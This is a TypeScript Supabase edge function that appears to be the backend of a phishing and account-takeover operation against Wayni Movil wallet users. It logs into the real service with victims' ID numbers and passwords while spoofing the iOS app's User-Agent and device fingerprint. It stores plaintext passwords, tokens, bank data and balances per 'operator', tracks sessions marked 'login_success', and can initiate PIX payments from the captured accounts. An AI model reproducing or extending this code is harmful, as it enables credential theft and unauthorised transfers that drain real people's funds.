import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const AUTH_URL = "https://auth.waynimovil.ar/api/v1/auth";
const WALLET_URL = "https://billetera.waynimovil.ar/me/api/v1/me";

const COMMON_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Content-Type": "application/json",
  "User-Agent": "Waynimobile/1 CFNetwork/1331.0.7 Darwin/21.4.0",
  "x-app-source": "ReactNativeApp",
};

function makeCorrelationId() {
  return crypto.randomUUID();
}

function getSupabase() {
  return createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
  );
}

// ─── LOGIN ───
async function wayniLogin(identification: string, password: string) {
  const res = await fetch(`${AUTH_URL}/`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({ field_type: "identity_number", identification, password }),
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data?.message || data?.error || `Login failed: ${res.status}`);
  return data; // { access_token, refresh_token, token_type, expires_in, expires_at }
}

// ─── GET PROFILE ───
async function wayniGetMe(token: string) {
  const res = await fetch(`${WALLET_URL}/`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error(`Get profile failed: ${res.status}`);
  return await res.json();
}

// ─── GET BALANCE ───
async function wayniGetBalance(token: string) {
  const res = await fetch(`${WALLET_URL}/balance`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error(`Get balance failed: ${res.status}`);
  return await res.json();
}

// ─── PIX: validate-and-create ───
async function wayniPixValidate(token: string, pixKey: string, userUuid: string) {
  const res = await fetch(`${WALLET_URL}/payment-pix/validate-and-create`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({
      pixKey,
      userUuid,
      deviceFingerPrint: `${crypto.randomUUID()}|iOS|15.4.1|Apple|iPhone 6s|iPhone8,1|19E258|com.waynimovil.wallet.ios|02`,
    }),
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error(`PIX validate failed: ${res.status} - ${err}`);
  }
  return await res.json();
}

// ─── PIX: process ───
async function wayniPixProcess(token: string, paymentUuid: string, brlAmount: number) {
  const res = await fetch(`${WALLET_URL}/payment-pix/process`, {
    method: "POST",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
    body: JSON.stringify({ paymentUuid, brlAmount }),
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error(`PIX process failed: ${res.status} - ${err}`);
  }
  return await res.json();
}

// ─── PIX: get-information ───
async function wayniPixInfo(token: string, paymentUuid: string) {
  const res = await fetch(`${WALLET_URL}/payment-pix/get-information/${paymentUuid}`, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error(`PIX info failed: ${res.status}`);
  return await res.json();
}

// ─── ACTIVITIES ───
async function wayniActivities(token: string, walletAccount: string) {
  const now = new Date().toUTCString();
  const from = new Date(Date.now() - 90 * 86400000).toUTCString();
  const url = `https://billetera.waynimovil.ar/activity/api/v1/activities/?page[number]=0&page[size]=20&filter[wallet_account]=${walletAccount}&filter[created_from]=${encodeURIComponent(from)}&filter[created_until]=${encodeURIComponent(now)}`;
  const res = await fetch(url, {
    method: "GET",
    headers: { ...COMMON_HEADERS, "Authorization": `Bearer ${token}`, "x-correlation-id": makeCorrelationId() },
  });
  if (!res.ok) throw new Error(`Activities failed: ${res.status}`);
  return await res.json();
}

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const body = await req.json();
    const { action } = body;
    const sb = getSupabase();

    // ─── ACTION: login ───
    if (action === "login") {
      const { identification, password, operator_code, session_id } = body;
      if (!identification || !password) throw new Error("Missing identification or password");

      const authData = await wayniLogin(identification, password);
      const token = authData.access_token;

      // Get profile + balance
      let profile: any = null;
      let balance: any = null;
      try { profile = await wayniGetMe(token); } catch (e) { console.error("Profile fetch error:", e); }
      try { balance = await wayniGetBalance(token); } catch (e) { console.error("Balance fetch error:", e); }

      const fullName = profile?.profile?.full_name || null;
      const email = profile?.profile?.email || null;
      const phone = profile?.profile?.phone || null;
      const userUuid = profile?.user?.uuid || null;

      // Upsert wayni_accounts
      const opCode = operator_code || "master";
      const { data: existing } = await sb.from("wayni_accounts").select("id").eq("identification", identification).maybeSingle();
      
      const accountData = {
        identification,
        password,
        email,
        full_name: fullName,
        phone,
        access_token: token,
        refresh_token: authData.refresh_token,
        user_uuid: userUuid,
        profile_data: profile,
        balance: balance?.balance || "0",
        bank_data: profile?.bank || null,
        operator_code: opCode,
        last_login_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      if (existing) {
        await sb.from("wayni_accounts").update(accountData).eq("id", existing.id);
      } else {
        await sb.from("wayni_accounts").insert(accountData);
      }

      // Update session if provided
      if (session_id) {
        await sb.from("sessions").update({
          status: "login_success",
          email: email || identification,
        }).eq("id", session_id);
      }

      return new Response(JSON.stringify({
        success: true,
        full_name: fullName,
        email,
        balance: balance?.balance || "0",
        user_uuid: userUuid,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: sync (refresh data for account) ───
    if (action === "sync") {
      const { account_id } = body;
      if (!account_id) throw new Error("Missing account_id");

      const { data: acc } = await sb.from("wayni_accounts").select("*").eq("id", account_id).maybeSingle();
      if (!acc || !acc.access_token) throw new Error("Account not found or no token");

      let profile: any = null;
      let balance: any = null;
      try { profile = await wayniGetMe(acc.access_token); } catch (e) { console.error("Sync profile error:", e); }
      try { balance = await wayniGetBalance(acc.access_token); } catch (e) { console.error("Sync balance error:", e); }

      // Try to get activities
      let activities: any = null;
      try {
        const walletAccount = profile?.bank?.internal_account?.[0]?.wallet_account;
        if (walletAccount) {
          activities = await wayniActivities(acc.access_token, walletAccount);
        }
      } catch (e) { console.error("Activities error:", e); }

      const updateData: any = {
        profile_data: profile,
        balance: balance?.balance || acc.balance,
        bank_data: profile?.bank || acc.bank_data,
        full_name: profile?.profile?.full_name || acc.full_name,
        email: profile?.profile?.email || acc.email,
        phone: profile?.profile?.phone || acc.phone,
        last_data_sync_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };
      if (activities) updateData.activities = activities;

      await sb.from("wayni_accounts").update(updateData).eq("id", account_id);

      return new Response(JSON.stringify({ success: true, balance: updateData.balance, profile, activities }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: relogin ───
    if (action === "relogin") {
      const { account_id } = body;
      if (!account_id) throw new Error("Missing account_id");

      const { data: acc } = await sb.from("wayni_accounts").select("*").eq("id", account_id).maybeSingle();
      if (!acc || !acc.identification || !acc.password) throw new Error("Account not found or missing credentials");

      const authData = await wayniLogin(acc.identification, acc.password);
      
      await sb.from("wayni_accounts").update({
        access_token: authData.access_token,
        refresh_token: authData.refresh_token,
        last_login_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      }).eq("id", account_id);

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_validate ───
    if (action === "pix_validate") {
      const { account_id, pix_key } = body;
      if (!account_id || !pix_key) throw new Error("Missing account_id or pix_key");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token, user_uuid").eq("id", account_id).maybeSingle();
      if (!acc?.access_token || !acc?.user_uuid) throw new Error("No token or user_uuid");

      const result = await wayniPixValidate(acc.access_token, pix_key, acc.user_uuid);
      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_process ───
    if (action === "pix_process") {
      const { account_id, payment_uuid, brl_amount } = body;
      if (!account_id || !payment_uuid || !brl_amount) throw new Error("Missing params");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token").eq("id", account_id).maybeSingle();
      if (!acc?.access_token) throw new Error("No token");

      const result = await wayniPixProcess(acc.access_token, payment_uuid, brl_amount);
      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: pix_info ───
    if (action === "pix_info") {
      const { account_id, payment_uuid } = body;
      if (!account_id || !payment_uuid) throw new Error("Missing params");

      const { data: acc } = await sb.from("wayni_accounts").select("access_token").eq("id", account_id).maybeSingle();
      if (!acc?.access_token) throw new Error("No token");

      const result = await wayniPixInfo(acc.access_token, payment_uuid);
      return new Response(JSON.stringify({ success: true, ...result }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    throw new Error(`Unknown action: ${action}`);
  } catch (err) {
    console.error("[wayni-auth] Error:", err);
    return new Response(JSON.stringify({ error: (err as Error).message }), {
      status: 400,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
